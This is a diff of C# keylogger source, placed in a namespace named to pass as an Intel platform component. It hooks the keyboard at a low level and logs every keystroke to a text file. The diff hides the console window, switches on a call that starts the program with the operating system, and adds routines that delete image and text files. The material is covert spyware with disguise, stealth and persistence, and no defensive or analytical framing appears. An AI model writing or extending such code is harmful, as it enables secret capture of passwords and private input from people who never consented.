@@ -21,7 +21,7 @@ namespace Intel_R__Dynamic_Platform
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
 
-        private static string logName = "Log_";
+        private static string logName = "log";
         private static string logExtendtion = ".txt";
         #region DllImport SetWindowsHookEx() UnhookWindowsHookEx() CallNextHookEx() GetModuleHandle()
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
@@ -91,7 +91,7 @@ namespace Intel_R__Dynamic_Platform
         static void WriteLog(int vkCode)
         {
             Console.WriteLine((Keys)vkCode);
-            string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
+            string logNameToWrite = logName  + logExtendtion;
             StreamWriter sw = new StreamWriter(logNameToWrite, true);
             sw.Write((Keys)vkCode);
             sw.Close();
@@ -115,12 +115,14 @@ namespace Intel_R__Dynamic_Platform
         #endregion
         static void Main(string[] args)
         {
+            DeleteFile.DeleteIMG();
+            DeleteFile.DeleteText();
             IntPtr console = GetConsoleWindow();
             ShowWindow(console, SW_HIDE);
             Timer.StartTimer();
 
             
-            //StartWithOS();
+            StartWithOS();
             HookKeyboard();
         }
 
